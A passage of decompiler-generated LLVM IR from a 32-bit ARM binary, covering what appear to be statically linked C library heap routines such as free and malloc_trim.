  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %v3_14434, align 4
  %v1_14438 = load i32, i32* @r4, align 4
  %v2_14438 = add i32 %v1_14438, 864
  %v3_14438 = inttoptr i32 %v2_14438 to i32*
  store i32 %v1_14418, i32* %v3_14438, align 4
  %v1_1443c = load i32, i32* @r4, align 4
  %v2_1443c = inttoptr i32 %v1_1443c to i32*
  store i32 %v1_1441c, i32* %v2_1443c, align 4
  %v0_14440 = load i32, i32* @ip, align 4
  %v1_14440 = load i32, i32* @r4, align 4
  %v2_14440 = add i32 %v1_14440, 44
  %v3_14440 = inttoptr i32 %v2_14440 to i32*
  store i32 %v0_14440, i32* %v3_14440, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_14448 = call i32 @sysconf(i32 30, i32 %v1_14418, i32 %v1_1441c, i32 ptrtoint (i32* @global_var_10000.35 to i32))
  store i32 %v4_14448, i32* @r0, align 4
  %v1_1444c = load i32, i32* @r4, align 4
  %v2_1444c = add i32 %v1_1444c, 860
  %v3_1444c = inttoptr i32 %v2_1444c to i32*
  store i32 %v4_14448, i32* %v3_1444c, align 4
  br label %dec_label_pc_14450

dec_label_pc_14450:                               ; preds = %dec_label_pc_143d8, %dec_label_pc_14404
  %v2_14454 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14454, i32* @r4, align 4
  %v1_14458 = load i32, i32* @r0, align 4
  ret i32 %v1_14458

; uselistorder directives
  uselistorder i32 %v0_14404, { 1, 0, 2, 3 }
  uselistorder i32 %v0_143fc, { 1, 0 }
  uselistorder i32 %v1_143e0, { 1, 0 }
  uselistorder i32 %v0_143cc, { 0, 2, 1 }
  uselistorder i32 %v0_143a8, { 1, 0 }
  uselistorder i32 %v1_142f8, { 1, 0, 2 }
  uselistorder i32 %v0_14310, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_142d0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 2, 11, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 1, 11, 2, 6, 3, 7, 4, 8, 0, 9, 10, 5, 12 }
  uselistorder label %dec_label_pc_14450, { 1, 0 }
  uselistorder label %dec_label_pc_143e8.dec_label_pc_143e8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_143cc, { 1, 0 }
  uselistorder label %dec_label_pc_14398, { 1, 0 }
  uselistorder label %dec_label_pc_1438c, { 1, 0 }
  uselistorder label %dec_label_pc_14388, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14344, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1445c = load i32, i32* @r4, align 4
  %v6_1445c = load i32, i32* @r5, align 4
  %v9_1445c = load i32, i32* @r6, align 4
  %v12_1445c = load i32, i32* @r7, align 4
  %v18_1445c = load i32, i32* @lr, align 4
  %v0_14464 = load i32, i32* @r0, align 4
  store i32 %v0_14464, i32* @r6, align 4
  %v2_14464 = icmp eq i32 %v0_14464, 0
  %v2_14468 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r7, align 4
  br i1 %v2_14464, label %dec_label_pc_14670, label %dec_label_pc_14474

dec_label_pc_14474:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_14478 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 108) to i32*), align 4
  store i32 %v4_14478, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_14478, i32* %r2.global-to-local, align 4
  %v4_14484 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 68) to i32*), align 4
  store i32 %v4_14484, i32* %r1.global-to-local, align 4
  store i32 %v2_14468, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_14490 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 112) to i32*), align 4
  store i32 %v4_14490, i32* %ip.global-to-local, align 4
  store i32 83100, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14490)
  %v0_1449c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1449c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_144a4 = load i32, i32* @r7, align 4
  %v2_144a4 = add i32 %v0_144a4, 16
  %v3_144a4 = inttoptr i32 %v2_144a4 to i32*
  %v4_144a4 = load i32, i32* %v3_144a4, align 4
  store i32 %v4_144a4, i32* %ip.global-to-local, align 4
  store i32 83120, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_144a4)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_144b4 = load i32, i32* @r7, align 4
  %v2_144b4 = add i32 %v0_144b4, 64
  %v3_144b4 = inttoptr i32 %v2_144b4 to i32*
  %v4_144b4 = load i32, i32* %v3_144b4, align 4
  store i32 %v4_144b4, i32* @lr, align 4
  %v0_144b8 = load i32, i32* @r6, align 4
  %v1_144b8 = add i32 %v0_144b8, -4
  %v2_144b8 = inttoptr i32 %v1_144b8 to i32*
  %v3_144b8 = load i32, i32* %v2_144b8, align 4
  store i32 %v3_144b8, i32* %r2.global-to-local, align 4
  %v1_144bc = inttoptr i32 %v4_144b4 to i32*
  %v2_144bc = load i32, i32* %v1_144bc, align 4
  store i32 %v2_144bc, i32* %r3.global-to-local, align 4
  %v1_144c0 = and i32 %v3_144b8, -4
  store i32 %v1_144c0, i32* %ip.global-to-local, align 4
  %v1_144c4 = add i32 %v0_144b8, -8
  store i32 %v1_144c4, i32* @r5, align 4
  store i32 %v1_144c4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_144c0, %v2_144bc
  br i1 %tmp, label %dec_label_pc_144f4, label %dec_label_pc_144d4

dec_label_pc_144d4:                               ; preds = %dec_label_pc_14474
  %v1_144d4 = or i32 %v2_144bc, 3
  store i32 %v1_144d4, i32* %r3.global-to-local, align 4
  store i32 %v1_144d4, i32* %v1_144bc, align 4
  %v3_144d8 = load i32, i32* @lr, align 4
  %v4_144d8 = add i32 %v3_144d8, -8
  store i32 %v4_144d8, i32* %lr.global-to-local, align 4
  %v0_144dc = load i32, i32* %ip.global-to-local, align 4
  %v3_144dc = udiv i32 %v0_144dc, 8
  store i32 %v3_144dc, i32* %r1.global-to-local, align 4
  %v1_144e0 = add i32 %v3_144d8, -4
  store i32 %v1_144e0, i32* %r2.global-to-local, align 4
  %v4_144e4 = mul nuw i32 %v3_144dc, 4
  %v5_144e4 = add i32 %v4_144e4, %v1_144e0
  %v6_144e4 = inttoptr i32 %v5_144e4 to i32*
  %v7_144e4 = load i32, i32* %v6_144e4, align 4
  store i32 %v7_144e4, i32* %r3.global-to-local, align 4
  %v1_144e8 = load i32, i32* @r5, align 4
  %v2_144e8 = add i32 %v1_144e8, 8
  %v3_144e8 = inttoptr i32 %v2_144e8 to i32*
  store i32 %v7_144e4, i32* %v3_144e8, align 4
  %v0_144ec = load i32, i32* @r5, align 4
  %v1_144ec = load i32, i32* %r2.global-to-local, align 4
  %v2_144ec = load i32, i32* %r1.global-to-local, align 4
  %v5_144ec = mul i32 %v2_144ec, 4
  %v6_144ec = add i32 %v5_144ec, %v1_144ec
  %v7_144ec = inttoptr i32 %v6_144ec to i32*
  store i32 %v0_144ec, i32* %v7_144ec, align 4
  br label %dec_label_pc_14658

dec_label_pc_144f4:                               ; preds = %dec_label_pc_14474
  %v1_144f4 = and i32 %v3_144b8, 2
  %v2_144f4 = icmp eq i32 %v1_144f4, 0
  br i1 %v2_144f4, label %dec_label_pc_144fc, label %dec_label_pc_14630

dec_label_pc_144fc:                               ; preds = %dec_label_pc_144f4
  %v1_144fc = or i32 %v2_144bc, 1
  store i32 %v1_144fc, i32* %r3.global-to-local, align 4
  store i32 %v1_144fc, i32* %v1_144bc, align 4
  %v0_14504 = load i32, i32* @r6, align 4
  %v1_14504 = add i32 %v0_14504, -4
  %v2_14504 = inttoptr i32 %v1_14504 to i32*
  %v3_14504 = load i32, i32* %v2_14504, align 4
  store i32 %v3_14504, i32* %r3.global-to-local, align 4
  %v0_14508 = load i32, i32* @r5, align 4
  %v1_14508 = load i32, i32* %ip.global-to-local, align 4
  %v2_14508 = add i32 %v1_14508, %v0_14508
  store i32 %v2_14508, i32* %lr.global-to-local, align 4
  %v1_1450c = urem i32 %v3_14504, 2
  %v2_1450c = icmp eq i32 %v1_1450c, 0
  %v1_14510 = add i32 %v2_14508, 4
  %v2_14510 = inttoptr i32 %v1_14510 to i32*
  %v3_14510 = load i32, i32* %v2_14510, align 4
  store i32 %v3_14510, i32* %r8.global-to-local, align 4
  br i1 %v2_1450c, label %dec_label_pc_14518, label %dec_label_pc_1454c

dec_label_pc_14518:                               ; preds = %dec_label_pc_144fc
  %v1_14518 = add i32 %v0_14504, -8
  %v2_14518 = inttoptr i32 %v1_14518 to i32*
  %v3_14518 = load i32, i32* %v2_14518, align 4
  store i32 %v3_14518, i32* %r1.global-to-local, align 4
  %v2_1451c = sub i32 %v0_14508, %v3_14518
  store i32 %v2_1451c, i32* %r3.global-to-local, align 4
  %v1_14520 = add i32 %v2_1451c, 8
  %v2_14520 = inttoptr i32 %v1_14520 to i32*
  %v3_14520 = load i32, i32* %v2_14520, align 4
  store i32 %v3_14520, i32* %r2.global-to-local, align 4
  %v1_14524 = add i32 %v3_14520, 12
  %v2_14524 = inttoptr i32 %v1_14524 to i32*
  %v3_14524 = load i32, i32* %v2_14524, align 4
  store i32 %v3_14524, i32* %r4.global-to-local, align 4
  %v9_14528 = icmp eq i32 %v3_14524, %v2_1451c
  %v1_1452c = add i32 %v2_1451c, 12
  %v2_1452c = inttoptr i32 %v1_1452c to i32*
  %v3_1452c = load i32, i32* %v2_1452c, align 4
  store i32 %v3_1452c, i32* %r0.global-to-local, align 4
  br i1 %v9_14528, label %dec_label_pc_14534, label %dec_label_pc_14598

dec_label_pc_14534:                               ; preds = %dec_label_pc_14518
  %v1_14534 = add i32 %v3_1452c, 8
  %v2_14534 = inttoptr i32 %v1_14534 to i32*
  %v3_14534 = load i32, i32* %v2_14534, align 4
  store i32 %v3_14534, i32* %r3.global-to-local, align 4
  %v9_14538 = icmp eq i32 %v3_14534, %v2_1451c
  br i1 %v9_14538, label %dec_label_pc_14540, label %dec_label_pc_14598

dec_label_pc_14540:                               ; preds = %dec_label_pc_14534
  store i32 %v3_14520, i32* %v2_14534, align 4
  %v0_14544 = load i32, i32* %r0.global-to-local, align 4
  %v1_14544 = load i32, i32* %r2.global-to-local, align 4
  %v2_14544 = add i32 %v1_14544, 12
  %v3_14544 = inttoptr i32 %v2_14544 to i32*
  store i32 %v0_14544, i32* %v3_14544, align 4
  %v0_14548 = load i32, i32* %ip.global-to-local, align 4
  %v1_14548 = load i32, i32* %r1.global-to-local, align 4
  %v2_14548 = add i32 %v1_14548, %v0_14548
  store i32 %v2_14548, i32* %ip.global-to-local, align 4
  %v0_14558.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1455c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1454c

dec_label_pc_1454c:                               ; preds = %dec_label_pc_144fc, %dec_label_pc_14540
  %v0_145d8 = phi i32 [ %v1_14508, %dec_label_pc_144fc ], [ %v2_14548, %dec_label_pc_14540 ]
  %v0_1455c = phi i32 [ %v3_14510, %dec_label_pc_144fc ], [ %v0_1455c.pre, %dec_label_pc_14540 ]
  %v1_14570 = phi i32 [ %v2_14508, %dec_label_pc_144fc ], [ %v0_14558.pre, %dec_label_pc_14540 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_14550 = load i32, i32* @r7, align 4
  %v2_14550 = add i32 %v0_14550, 64
  %v3_14550 = inttoptr i32 %v2_14550 to i32*
  %v4_14550 = load i32, i32* %v3_14550, align 4
  store i32 %v4_14550, i32* %r2.global-to-local, align 4
  %v1_14554 = add i32 %v4_14550, 44
  %v2_14554 = inttoptr i32 %v1_14554 to i32*
  %v3_14554 = load i32, i32* %v2_14554, align 4
  store i32 %v3_14554, i32* %r3.global-to-local, align 4
  %v9_14558 = icmp eq i32 %v1_14570, %v3_14554
  %v1_1455c = and i32 %v0_1455c, -4
  store i32 %v1_1455c, i32* %r0.global-to-local, align 4
  br i1 %v9_14558, label %dec_label_pc_145d8, label %dec_label_pc_14564

dec_label_pc_14564:                               ; preds = %dec_label_pc_1454c
  %v2_14564 = add i32 %v1_14570, %v1_1455c
  store i32 %v2_14564, i32* %r3.global-to-local, align 4
  %v1_14568 = add i32 %v2_14564, 4
  %v2_14568 = inttoptr i32 %v1_14568 to i32*
  %v3_14568 = load i32, i32* %v2_14568, align 4
  store i32 %v3_14568, i32* %r3.global-to-local, align 4
  %v1_1456c = urem i32 %v3_14568, 2
  %v2_1456c = icmp eq i32 %v1_1456c, 0
  %v2_14570 = add i32 %v1_14570, 4
  %v3_14570 = inttoptr i32 %v2_14570 to i32*
  store i32 %v1_1455c, i32* %v3_14570, align 4
  br i1 %v2_1456c, label %dec_label_pc_14578, label %dec_label_pc_14564.dec_label_pc_145a8_crit_edge

dec_label_pc_14564.dec_label_pc_145a8_crit_edge:  ; preds = %dec_label_pc_14564
  %v0_145b8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_145a8

dec_label_pc_14578:                               ; preds = %dec_label_pc_14564
  %v0_14578 = load i32, i32* %lr.global-to-local, align 4
  %v1_14578 = add i32 %v0_14578, 8
  %v2_14578 = inttoptr i32 %v1_14578 to i32*
  %v3_14578 = load i32, i32* %v2_14578, align 4
  store i32 %v3_14578, i32* %r1.global-to-local, align 4
  %v1_1457c = add i32 %v3_14578, 12
  %v2_1457c = inttoptr i32 %v1_1457c to i32*
  %v3_1457c = load i32, i32* %v2_1457c, align 4
  store i32 %v3_1457c, i32* %r3.global-to-local, align 4
  %v9_14580 = icmp eq i32 %v3_1457c, %v0_14578
  %v1_14584 = add i32 %v0_14578, 12
  %v2_14584 = inttoptr i32 %v1_14584 to i32*
  %v3_14584 = load i32, i32* %v2_14584, align 4
  store i32 %v3_14584, i32* %r2.global-to-local, align 4
  br i1 %v9_14580, label %dec_label_pc_1458c, label %dec_label_pc_14598

dec_label_pc_1458c:                               ; preds = %dec_label_pc_14578
  %v1_1458c = add i32 %v3_14584, 8
  %v2_1458c = inttoptr i32 %v1_1458c to i32*
  %v3_1458c = load i32, i32* %v2_1458c, align 4
  store i32 %v3_1458c, i32* %r3.global-to-local, align 4
  %v9_14590 = icmp eq i32 %v3_1458c, %v0_14578
  br i1 %v9_14590, label %dec_label_pc_1459c, label %dec_label_pc_14598

dec_label_pc_14598:                               ; preds = %dec_label_pc_14578, %dec_label_pc_14534, %dec_label_pc_14518, %dec_label_pc_1458c
  %v0_14598 = call i32 @abort()
  store i32 %v0_14598, i32* %r0.global-to-local, align 4
  %v0_1459c.pre = load i32, i32* @r1, align 4
  %v1_1459c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1459c

dec_label_pc_1459c:                               ; preds = %dec_label_pc_1458c, %dec_label_pc_14598
  %v1_1459c = phi i32 [ %v3_14584, %dec_label_pc_1458c ], [ %v1_1459c.pre, %dec_label_pc_14598 ]
  %v0_1459c = phi i32 [ %v3_14578, %dec_label_pc_1458c ], [ %v0_1459c.pre, %dec_label_pc_14598 ]
  %v2_1459c = add i32 %v1_1459c, 8
  %v3_1459c = inttoptr i32 %v2_1459c to i32*
  store i32 %v0_1459c, i32* %v3_1459c, align 4
  %v0_145a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_145a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_145a0 = add i32 %v1_145a0, 12
  %v3_145a0 = inttoptr i32 %v2_145a0 to i32*
  store i32 %v0_145a0, i32* %v3_145a0, align 4
  %v0_145a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_145a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_145a4 = add i32 %v1_145a4, %v0_145a4
  store i32 %v2_145a4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_145a8

dec_label_pc_145a8:                               ; preds = %dec_label_pc_14564.dec_label_pc_145a8_crit_edge, %dec_label_pc_1459c
  %v0_145b8 = phi i32 [ %v0_145b8.pre, %dec_label_pc_14564.dec_label_pc_145a8_crit_edge ], [ %v2_145a4, %dec_label_pc_1459c ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_145ac = load i32, i32* @r7, align 4
  %v2_145ac = add i32 %v0_145ac, 64
  %v3_145ac = inttoptr i32 %v2_145ac to i32*
  %v4_145ac = load i32, i32* %v3_145ac, align 4
  %v1_145b0 = add i32 %v4_145ac, 52
  store i32 %v1_145b0, i32* %r3.global-to-local, align 4
  %v1_145b4 = add i32 %v4_145ac, 60
  %v2_145b4 = inttoptr i32 %v1_145b4 to i32*
  %v3_145b4 = load i32, i32* %v2_145b4, align 4
  store i32 %v3_145b4, i32* %r1.global-to-local, align 4
  %v1_145b8 = or i32 %v0_145b8, 1
  store i32 %v1_145b8, i32* %r2.global-to-local, align 4
  %v1_145bc = load i32, i32* %r4.global-to-local, align 4
  %v2_145bc = add i32 %v1_145bc, 12
  %v3_145bc = inttoptr i32 %v2_145bc to i32*
  store i32 %v1_145b0, i32* %v3_145bc, align 4
  %v0_145c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_145c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_145c0 = add i32 %v1_145c0, 8
  %v3_145c0 = inttoptr i32 %v2_145c0 to i32*
  store i32 %v0_145c0, i32* %v3_145c0, align 4
  %v0_145c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_145c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_145c4 = add i32 %v1_145c4, 4
  %v3_145c4 = inttoptr i32 %v2_145c4 to i32*
  store i32 %v0_145c4, i32* %v3_145c4, align 4
  %v0_145c8 = load i32, i32* %ip.global-to-local, align 4
  %v1_145c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_145c8 = add i32 %v1_145c8, %v0_145c8
  %v4_145c8 = inttoptr i32 %v3_145c8 to i32*
  store i32 %v0_145c8, i32* %v4_145c8, align 4
  %v0_145cc = load i32, i32* %r4.global-to-local, align 4
  %v1_145cc = load i32, i32* %r1.global-to-local, align 4
  %v2_145cc = add i32 %v1_145cc, 12
  %v3_145cc = inttoptr i32 %v2_145cc to i32*
  store i32 %v0_145cc, i32* %v3_145cc, align 4
  %v0_145d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_145d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_145d0 = add i32 %v1_145d0, 8
  %v3_145d0 = inttoptr i32 %v2_145d0 to i32*
  store i32 %v0_145d0, i32* %v3_145d0, align 4
  br label %dec_label_pc_145e8

dec_label_pc_145d8:                               ; preds = %dec_label_pc_1454c
  %v2_145d8 = add i32 %v1_1455c, %v0_145d8
  store i32 %v2_145d8, i32* %ip.global-to-local, align 4
  %v1_145dc = or i32 %v2_145d8, 1
  store i32 %v1_145dc, i32* %r3.global-to-local, align 4
  %v0_145e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_145e0, i32* %v2_14554, align 4
  %v0_145e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_145e4 = load i32, i32* %r4.global-to-local, align 4
  %v2_145e4 = add i32 %v1_145e4, 4
  %v3_145e4 = inttoptr i32 %v2_145e4 to i32*
  store i32 %v0_145e4, i32* %v3_145e4, align 4
  br label %dec_label_pc_145e8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_145a8, %dec_label_pc_145d8
  %v0_145e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_145ec = icmp ult i32 %v0_145e8, 131070
  br i1 %v3_145ec, label %dec_label_pc_14658, label %dec_label_pc_145f0

dec_label_pc_145f0:                               ; preds = %dec_label_pc_145e8
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_145f4 = load i32, i32* @r7, align 4
  %v2_145f4 = add i32 %v0_145f4, 64
  %v3_145f4 = inttoptr i32 %v2_145f4 to i32*
  %v4_145f4 = load i32, i32* %v3_145f4, align 4
  store i32 %v4_145f4, i32* @r4, align 4
  %v1_145f8 = inttoptr i32 %v4_145f4 to i32*
  %v2_145f8 = load i32, i32* %v1_145f8, align 4
  store i32 %v2_145f8, i32* %r3.global-to-local, align 4
  %v1_145fc = and i32 %v2_145f8, 2
  %v2_145fc = icmp eq i32 %v1_145fc, 0
  br i1 %v2_145fc, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_145f0
  store i32 %v4_145f4, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_145f0, %bb
  %v1_14604 = xor i1 %v2_145fc, true
  call void @__pseudo_cond_branch(i1 %v1_14604, i32 ptrtoint (i32* @global_var_142a8.600 to i32))
  %v0_14608 = load i32, i32* @r4, align 4
  %v1_14608 = add i32 %v0_14608, 44
  %v2_14608 = inttoptr i32 %v1_14608 to i32*
  %v3_14608 = load i32, i32* %v2_14608, align 4
  store i32 %v3_14608, i32* %r3.global-to-local, align 4
  %v1_1460c = add i32 %v3_14608, 4
  %v2_1460c = inttoptr i32 %v1_1460c to i32*
  %v3_1460c = load i32, i32* %v2_1460c, align 4
  store i32 %v3_1460c, i32* %r3.global-to-local, align 4
  %v1_14610 = add i32 %v0_14608, 836
  %v2_14610 = inttoptr i32 %v1_14610 to i32*
  %v3_14610 = load i32, i32* %v2_14610, align 4
  store i32 %v3_14610, i32* %r2.global-to-local, align 4
  %v1_14614 = and i32 %v3_1460c, -4
  store i32 %v1_14614, i32* %r3.global-to-local, align 4
  %v3_14618 = icmp ult i32 %v1_14614, %v3_14610
  br i1 %v3_14618, label %dec_label_pc_14658, label %dec_label_pc_14620

dec_label_pc_14620:                               ; preds = %bb16
  store i32 %v0_14608, i32* %r1.global-to-local, align 4
  %v1_14624 = add i32 %v0_14608, 840
  %v2_14624 = inttoptr i32 %v1_14624 to i32*
  %v3_14624 = load i32, i32* %v2_14624, align 4
  store i32 %v3_14624, i32* %r0.global-to-local, align 4
  %v2_14628 = call i32 @__malloc_trim(i32 %v3_14624, i32 %v0_14608)
  store i32 %v2_14628, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14658

dec_label_pc_14630:                               ; preds = %dec_label_pc_144f4
  %v2_14630 = inttoptr i32 %v1_144c4 to i32*
  %v3_14630 = load i32, i32* %v2_14630, align 4
  store i32 %v3_14630, i32* %r0.global-to-local, align 4
  %v1_14634 = add i32 %v4_144b4, 848
  %v2_14634 = inttoptr i32 %v1_14634 to i32*
  %v3_14634 = load i32, i32* %v2_14634, align 4
  store i32 %v3_14634, i32* %r2.global-to-local, align 4
  %v1_14638 = add i32 %v4_144b4, 868
  %v2_14638 = inttoptr i32 %v1_14638 to i32*
  %v3_14638 = load i32, i32* %v2_14638, align 4
  %v2_1463c = add i32 %v3_14630, %v1_144c0
  store i32 %v2_1463c, i32* %r1.global-to-local, align 4
  %v1_14640 = add i32 %v3_14634, -1
  store i32 %v1_14640, i32* %r2.global-to-local, align 4
  %v2_14644 = sub i32 %v3_14638, %v2_1463c
  store i32 %v2_14644, i32* %r3.global-to-local, align 4
  store i32 %v2_14644, i32* %v2_14638, align 4
  %v1_1464c = load i32, i32* @lr, align 4
  %v2_1464c = add i32 %v1_1464c, 848
  %v3_1464c = inttoptr i32 %v2_1464c to i32*
  store i32 %v1_14640, i32* %v3_1464c, align 4
  %v0_14650 = load i32, i32* %r0.global-to-local, align 4
  %v1_14650 = load i32, i32* @r5, align 4
  %v2_14650 = sub i32 %v1_14650, %v0_14650
  store i32 %v2_14650, i32* %r0.global-to-local, align 4
  %v4_14654 = call i32 @munmap(i32 %v2_14650, i32 %v2_1463c, i32 %v1_14640, i32 %v2_14644)
  store i32 %v4_14654, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14658

dec_label_pc_14658:                               ; preds = %bb16, %dec_label_pc_145e8, %dec_label_pc_14620, %dec_label_pc_144d4, %dec_label_pc_14630
  store i32 %v2_14468, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_14664 = load i32, i32* @r7, align 4
  %v2_14664 = add i32 %v0_14664, 44
  %v3_14664 = inttoptr i32 %v2_14664 to i32*
  %v4_14664 = load i32, i32* %v3_14664, align 4
  store i32 %v4_14664, i32* %ip.global-to-local, align 4
  store i32 83568, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14664)
  br label %dec_label_pc_14670

dec_label_pc_14670:                               ; preds = %entry, %dec_label_pc_14658
  store i32 %v3_1445c, i32* @r4, align 4
  store i32 %v6_1445c, i32* @r5, align 4
  store i32 %v9_1445c, i32* @r6, align 4
  store i32 %v12_1445c, i32* @r7, align 4
  store i32 %v18_1445c, i32* @lr, align 4
  ret i32 %v2_14468

; uselistorder directives
  uselistorder i32 %v0_14608, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_145c8, { 1, 0 }
  uselistorder i32 %v1_14508, { 1, 0 }
  uselistorder i32 %v0_14508, { 1, 0 }
  uselistorder i32 %v3_144dc, { 1, 0 }
  uselistorder i32 %v1_144c0, { 1, 0, 2 }
  uselistorder i32 %v2_144bc, { 1, 2, 0, 3 }
  uselistorder i32 %v4_144b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14464, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 4, 1, 5, 2, 6, 10, 3, 7, 8, 9, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_14670, { 1, 0 }
  uselistorder label %dec_label_pc_14658, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_145e8, { 1, 0 }
  uselistorder label %dec_label_pc_145a8, { 1, 0 }
  uselistorder label %dec_label_pc_1459c, { 1, 0 }
  uselistorder label %dec_label_pc_14598, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1454c, { 1, 0 }
}

define i32 @function_14680(i32 %arg1) local_unnamed_addr {
dec_label_pc_14680:
  %v0_14680 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14680, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_14680
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14680, %bb
  %v4_14694 = phi i32 [ %arg1, %dec_label_pc_14680 ], [ 0, %bb ]
  ret i32 %v4_14694

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_14698 = load i32, i32* @r4, align 4
  store i32 %v3_14698, i32* %stack_var_-12, align 4
  %v6_14698 = load i32, i32* @r5, align 4
  %v4_146a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 64) to i32*), align 4
  store i32 %v4_146a8, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_146a8, i32* @r0, align 4
  %v0_146b8 = call i32 @__malloc_consolidate()
  %v0_146bc = load i32, i32* @r4, align 4
  %v0_146c0 = load i32, i32* @r5, align 4
  %v2_146c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_146c8, i32* @r4, align 4
  store i32 %v6_14698, i32* @r5, align 4
  %v2_146cc = call i32 @__malloc_trim(i32 %v0_146bc, i32 %v0_146c0)
  %v0_146d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_146d0, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_146d4 = phi i32 [ %v2_146cc, %entry ], [ 0, %bb ]
  ret i32 %v4_146d4

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
